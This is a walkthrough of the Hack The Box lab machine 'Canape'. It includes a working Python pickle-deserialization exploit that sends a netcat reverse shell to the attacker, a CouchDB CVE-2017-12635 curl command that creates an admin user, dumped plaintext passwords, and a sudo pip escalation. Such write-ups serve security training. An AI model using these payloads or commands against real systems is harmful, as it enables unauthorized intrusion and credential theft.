---
title: "[HTB] Machine: Canape"
description: "[HTB] Machine: Canape"
date: 2023-10-17
menu:
  sidebar:
    name: "[HTB] Machine: Canape"
    identifier: htb-machine-Canape
    parent: htb-machines-linux
    weight: 10
hero: images/canape.png
tags: ["HTB", "pickle", "deserialization", "couchdb", "flask", "pip", "sudo", "cve-2017-12635", "gtfobins"]
---

# Canape
## Enumeration
- `nmap`
```
└─$ nmap -Pn -p- 10.10.10.70                                                                                             
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-19 20:00 BST
Nmap scan report for 10.10.10.70 (10.10.10.70)
Host is up (0.10s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
65535/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 278.86 seconds
```
```
└─$ nmap -Pn -p80,65535 -sC -sV 10.10.10.70
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-19 20:07 BST
Nmap scan report for 10.10.10.70 (10.10.10.70)
Host is up (0.12s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-git: 
|   10.10.10.70:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Last commit message: final # Please enter the commit message for your changes. Li...
|     Remotes:
|_      http://git.canape.htb/simpsons.git
|_http-title: Simpsons Fan Site
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-trane-info: Problem with XML parsing of /evox/about
65535/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8d:82:0b:31:90:e4:c8:85:b2:53:8b:a1:7c:3b:65:e1 (RSA)
|   256 22:fc:6e:c3:55:00:85:0f:24:bf:f5:79:6c:92:8b:68 (ECDSA)
|_  256 0d:91:27:51:80:5e:2b:a3:81:0d:e9:d8:5c:9b:77:35 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.98 seconds

```

- Web server 

![](./images/1.png)

- `.git`

![](./images/2.png)

![](./images/3.png)


```
└─$ git clone http://git.canape.htb/simpsons.git                                                                                                               
Cloning into 'simpsons'...
remote: Counting objects: 49, done.
remote: Compressing objects: 100% (47/47), done.
remote: Total 49 (delta 18), reused 0 (delta 0)
Unpacking objects: 100% (49/49), 163.16 KiB | 177.00 KiB/s, done.
```
## Foothold
- Let's check `repo`
```
└─$ git log --oneline                           
524f9dd (HEAD -> master, origin/master, origin/HEAD) final
999b869 remove a
a762ade a
f197cbf remove doh
36acc97 add doh
fb79852 remove f
64ed42c add f
7b15317 MORE TROLLS
a389475 trollface
f9be9a9 add note
c8a74a0 temporarily hide check due to vulerability
e7bfbcf initial

```

- If we checkout to `c8a74a0`, the vulnerability could be related to `cPickle.loads`, which deserializes data

![](./images/4.png)

- The current commit still uses `cPickle.loads`, which we can try to exploit
  - Send `char` and `quote` which will contain `p1` and `payload` to exploit the library
  - I also have to have `char` to be one of the whitelisted characters from the source code

![](./images/5.png)

- Let's generate a payload
  - https://exploit-notes.hdks.org/exploit/web/framework/python/python-pickle-rce/
  - Script used to exploit 
```
import cPickle
import os
import sys
import requests
from hashlib import md5

class RCE(object):
	def __init__(self, cmd):
		self.cmd = cmd
	def __reduce__(self):
		return (os.system, (self.cmd,))

if __name__ == "__main__":
	ip = sys.argv[1]
	port = sys.argv[2]
	cmd = "echo homer && rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1|nc {} {} >/tmp/f".format(ip, port)
	payload = cPickle.dumps(RCE(cmd))

	char = payload
	quote = "HELLO"
	_id = md5(char+quote).hexdigest()
	
	print("Filename: {}".format(_id))
	print("Payload: {}".format(payload))
	data = { 'character' : payload, 'quote' : quote }
	r = requests.post('http://10.10.10.70/submit', data = data)
	
	if r.status_code != 200:
		print(r.content)
		print("Error: Failed to submit payload")
		sys.exit()
	
	data = { 'id' : _id }
	r = requests.post('http://10.10.10.70/check', data = data, timeout=1)
	print(r.content)

```
- Execute the script

![](./images/6.png)

## User
- We saw from source that application uses [couchdb](https://couchdb.apache.org/)
```
www-data@canape:/$ netstat -tulpn | grep LISTEN
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 0.0.0.0:65535           0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:5984          0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:5986          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:4369            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:45077           0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::65535                :::*                    LISTEN      -               
tcp6       0      0 :::4369                 :::*                    LISTEN      -   
```

- We can access it via `curl`
  - Dump all databases
```
www-data@canape:/$ curl http://localhost:5984/_all_dbs
["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
```

- We can't access `_users` and `passwords`
  - But we can access `simposons`
```
www-data@canape:/$ curl http://localhost:5984/simpsons/_all_docs
{"total_rows":7,"offset":0,"rows":[
{"id":"f0042ac3dc4951b51f056467a1000dd9","key":"f0042ac3dc4951b51f056467a1000dd9","value":{"rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329"}},
{"id":"f53679a526a868d44172c83a61000d86","key":"f53679a526a868d44172c83a61000d86","value":{"rev":"1-7b8ec9e1c3e29b2a826e3d14ea122f6e"}},
{"id":"f53679a526a868d44172c83a6100183d","key":"f53679a526a868d44172c83a6100183d","value":{"rev":"1-e522ebc6aca87013a89dd4b37b762bd3"}},
{"id":"f53679a526a868d44172c83a61002980","key":"f53679a526a868d44172c83a61002980","value":{"rev":"1-3bec18e3b8b2c41797ea9d61a01c7cdc"}},
{"id":"f53679a526a868d44172c83a61003068","key":"f53679a526a868d44172c83a61003068","value":{"rev":"1-3d2f7da6bd52442e4598f25cc2e84540"}},
{"id":"f53679a526a868d44172c83a61003a2a","key":"f53679a526a868d44172c83a61003a2a","value":{"rev":"1-4446bfc0826ed3d81c9115e450844fb4"}},
{"id":"f53679a526a868d44172c83a6100451b","key":"f53679a526a868d44172c83a6100451b","value":{"rev":"1-3f6141f3aba11da1d65ff0c13fe6fd39"}}
]}
```

- Nothing interesting, but googling results suggests `PrivEsc`
  - https://book.hacktricks.xyz/network-services-pentesting/5984-pentesting-couchdb#couchdb-privilege-escalation-cve-2017-12635
```
www-data@canape:/$ curl -X PUT -d '{"type":"user","name":"pentest","roles":["_admin"],"roles":[],"password":"pentest"}' localhost:5984/_users/org.couchdb.user:pentest -H "Content-Type:application/json"
{"ok":true,"id":"org.couchdb.user:pentest","rev":"1-3e8e089db7c949bb15701856d525bd2d"}
```

- Now we can access `passwords` database
```
www-data@canape:/$ curl http://pentest:pentest@localhost:5984/passwords
{"db_name":"passwords","update_seq":"46-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkR2PoiQFIJlkD1bHik-dA0hdPGF1CSB19QTV5bEASYYGIAVUOp8YtQsgavcTo_YARO39rER8AQRR-wCiFuhetiwA7ytvXA","sizes":{"file":222462,"external":665,"active":1740},"purge_seq":0,"other":{"data_size":665},"doc_del_count":0,"doc_count":4,"disk_size":222462,"disk_format_version":6,"data_size":1740,"compact_running":false,"instance_start_time":"0"}
```
```
www-data@canape:/$ curl http://pentest:pentest@localhost:5984/passwords/_all_docs
{"total_rows":4,"offset":0,"rows":[
{"id":"739c5ebdf3f7a001bebb8fc4380019e4","key":"739c5ebdf3f7a001bebb8fc4380019e4","value":{"rev":"2-81cf17b971d9229c54be92eeee723296"}},
{"id":"739c5ebdf3f7a001bebb8fc43800368d","key":"739c5ebdf3f7a001bebb8fc43800368d","value":{"rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e"}},
{"id":"739c5ebdf3f7a001bebb8fc438003e5f","key":"739c5ebdf3f7a001bebb8fc438003e5f","value":{"rev":"1-77cd0af093b96943ecb42c2e5358fe61"}},
{"id":"739c5ebdf3f7a001bebb8fc438004738","key":"739c5ebdf3f7a001bebb8fc438004738","value":{"rev":"1-49a20010e64044ee7571b8c1b902cf8c"}}
]}
```
```
www-data@canape:/$ curl http://pentest:pentest@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4
{"_id":"739c5ebdf3f7a001bebb8fc4380019e4","_rev":"2-81cf17b971d9229c54be92eeee723296","item":"ssh","password":"0B4jyA0xtytZi7esBNGp","user":""}
www-data@canape:/$ curl http://pentest:pentest@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc43800368d
{"_id":"739c5ebdf3f7a001bebb8fc43800368d","_rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e","item":"couchdb","password":"r3lax0Nth3C0UCH","user":"couchy"}
www-data@canape:/$ curl http://pentest:pentest@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438003e5f
{"_id":"739c5ebdf3f7a001bebb8fc438003e5f","_rev":"1-77cd0af093b96943ecb42c2e5358fe61","item":"simpsonsfanclub.com","password":"h02ddjdj2k2k2","user":"homer"}
www-data@canape:/$ curl http://pentest:pentest@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438004738
{"_id":"739c5ebdf3f7a001bebb8fc438004738","_rev":"1-49a20010e64044ee7571b8c1b902cf8c","user":"homerj0121","item":"github","password":"STOP STORING YOUR PASSWORDS HERE -Admin"}
```

- We saw `ssh` port during `nmap` enumeration
  - And the only user present on the box is `homer`
  - Trying password `0B4jyA0xtytZi7esBNGp` works
```
└─$ sshpass -p '0B4jyA0xtytZi7esBNGp' ssh homer@10.10.10.70 -p 65535
Warning: Permanently added '[10.10.10.70]:65535' (ED25519) to the list of known hosts.
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Tue Apr 10 12:57:08 2018 from 10.10.14.5
homer@canape:~$ 

```
## Root
- `sudo`
```
homer@canape:~$ sudo -l
[sudo] password for homer: 
Matching Defaults entries for homer on canape:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User homer may run the following commands on canape:
    (root) /usr/bin/pip install *

```

- Check [GTFOBins](https://gtfobins.github.io/gtfobins/pip/#sudosu)


![](./images/7.png)